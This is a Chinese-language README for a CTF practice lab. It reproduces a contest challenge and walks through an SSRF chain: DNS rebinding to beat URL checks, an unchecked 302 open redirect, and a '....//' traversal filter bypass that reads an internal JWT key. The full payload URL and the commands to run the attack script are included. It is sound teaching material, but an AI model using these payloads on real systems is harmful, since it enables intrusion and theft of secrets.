# SupplyLink CTF Lab

> 源码来自 **第四届"数信杯"网络安全大赛 团队线下赛** 的一道实操题（附件 `www.zip`，一套 PHP 供应链协同平台）。本仓库额外提供本地复现实验环境，可完整打通题目的 SSRF 攻击链。

## 一句话概括

基于 TOCTOU 的 SSRF：**check**（校验 URL 时域名解析成公网 IP，顺利放行）与 **use**（实际抓取时同一域名解析成 `127.0.0.1`）之间存在时间差，两次 DNS 解析结果不同——校验看的是"门口"，攻击打的是"屋里"。再借 302 跳转后不重验、`....//` 绕过目录穿越，最终让服务器自己 `include` 任意文件并以 zip 归档回传。

## 关键 Payload

```
http://<任意的字符串_p>.cache.rebind.huanyutech.cn:8080/jump.php?url=http%3A%2F%2F127.0.0.1%3A8081%2Fdebug%2Fpreview.php%3Ffile%3D....%2F%2F....%2F%2F....%2F%2Fopt%2Fsupplylink%2Fconfig%2Fjwt.key
```

解码后就是两次请求拼接：

```
# 第 1 次（走 8080 公网代理缓存，命中 DNS Rebinding 域名）
http://momo77.cache.rebind.huanyutech.cn:8080/jump.php
    ?url=

# 第 2 次（jump.php 302 跳转的目标，由服务器自己跟随访问）
http://127.0.0.1:8081/debug/preview.php
    ?file=....//....//....//opt/supplylink/config/jwt.key
```

## 它是怎么一步步"逃离"限制的（与源码逐条对应）

| # | 代码位置 | 表面上的限制 | Payload 的绕过方式 |
|---|---------|-------------|-------------------|
| 1 | `public/index.php:31-40` | `source_url` 经过 `is_ssrf_safe_url()` 校验 | 提交 rebinding 子域名，校验时它解析成公网 IP，顺利放行 |
| 2 | `src/import_service.php` `is_blocked_ip()` | `dns_get_record` 拿到 A 记录后按黑名单拦截内网 IP | DNS 服务器由题目方控制（`dns/rebind_dns.py`），同一域名轮流返回公网 IP / `127.0.0.1`，校验那一下恰好是公网 IP |
| 3 | `src/import_service.php` `fetch_remote_document()` | —（防线漏洞）`follow_location => 1`，跟随 302 后**不再重新校验** | 校验只发生在最初那个 URL 上；302 之后去哪，没人再管 |
| 4 | `public/jump.php` | 只对 `target` 做"非空 + 含点号"的弱校验，随后直接 `header('Location: ...')` | 开放重定向：让它把请求转向 `127.0.0.1:8081`。注意——跟随 302 的是**服务器的 `file_get_contents`**，不是浏览器，所以 `preview.php` 看到的 `REMOTE_ADDR` 就是服务器自己的 `127.0.0.1` |
| 5 | `internal/preview.php` `is_internal_request()` | 仅允许 `127.0.0.1` 访问 | 请求由服务器本机发起，天然满足 |
| 6 | `internal/preview.php` `normalize_relative_path()` | `str_replace(['..'], '', ...)` 过滤 `..` | **单遍**替换：`....//` 被删掉中间的 `..` 后，两侧的 `.` 和 `/` 拼出新的 `../`，目录穿越复活 |
| 7 | `internal/preview.php` | `include $target` + `archive_and_stream()` | 目标文件被 zip 打包后流式回传，`file_get_contents` 把归档内容当成"导入结果"带回——攻击者拿到的就是内部文件本体 |

一句话：**校验管"入口 URL"，跳转管"实际目的地"，两个角色各信一半，中间的缝就是漏洞。**

## 本地复现（Linux / macOS）

```bash
git clone https://github.com/zigyr/supplylink-ctf-lab.git
cd supplylink-ctf-lab
sudo bash lab/start_lab.sh      # 部署站点 + 本地 DNS 劫持 + 启动 3 个 PHP 服务
python3 lab/attack.py           # 任务一：读取 /var/flag.txt
python3 lab/attack.py "....//....//....//opt/supplylink/config/jwt.key"   # 任务二：读 JWT 密钥
sudo bash lab/stop_lab.sh       # 收工：停服务、恢复 DNS、清理 /opt /var/flag
```

更多细节见 `lab/README.md`。

## 目录结构

```
├── source/   # www.zip 原始题目源码（public/ internal/ src/ scripts/ dns/）
└── lab/      # 本地复现：启动/停止脚本、攻击脚本、单步调试工具、实验指南
```

> 仅供学习与研究，请勿用于真实目标。
